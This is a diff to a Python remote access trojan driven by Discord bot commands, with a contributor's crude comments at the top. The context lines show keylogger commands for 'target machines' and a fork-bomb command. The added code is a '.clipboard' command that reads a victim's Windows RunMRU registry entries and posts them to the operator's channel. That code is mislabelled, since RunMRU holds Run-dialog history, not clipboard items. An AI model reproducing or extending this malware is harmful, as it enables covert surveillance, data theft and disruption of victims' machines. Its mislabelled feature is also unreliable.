@@ -1,6 +1,11 @@
 # synthetic#2368
 # dm me for updates on project
 # https://t.me/syntheticlol
+
+
+# primetdm was here 
+# also @sythetic ur fucking evil for writing the shit in line#678 rofl
+# if u didnt like my code then just dont do the PR I've sent I didn't go through your code so my shit could be wrong asf
 ##########################################
 import os
 import cv2
@@ -105,6 +110,7 @@ Information Gathering:
   .startkeylogger <sesisonkey>: Logs Key Strokes 
   .stopkeylogger <seesionnkey>: Stops KeyStrokes
   .dumpkeylogger <sessionkey>: Dumpskey log.txt from target machines
+  .clipboard <sessionkey>: Sends last few copied items using winReg lib.
 
 File Management:
 
@@ -177,6 +183,31 @@ async def forkbomb(ctx, seshn: str):
         command = "%0|%0"
         subprocess.Popen(command, shell=True, preexec_fn=os.setpgrp)
         await ctx.send(f"Forkbombed session :rofl:")
+    else:
+        pass
+    
+import winreg
+
+@bot.command()
+async def clipboard(ctx, seshn: str, limit: int = 10):
+    session = sessions.get(seshn.lower())
+    if session:
+        try:
+            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU", 0, winreg.KEY_READ)
+            i = 0
+            clipboard_contents = []
+            while True:
+                try:
+                    name, value, _ = winreg.EnumValue(key, i)
+                    clipboard_contents.append(value)
+                    i += 1
+                except WindowsError:
+                    break
+            winreg.CloseKey(key)
+            clipboard_contents = clipboard_contents[-limit:]  # get the last few copied items
+            await ctx.send("\n".join(clipboard_contents))
+        except WindowsError:
+            await ctx.send("Failed to retrieve clipboard contents.")
     else:
         pass
 
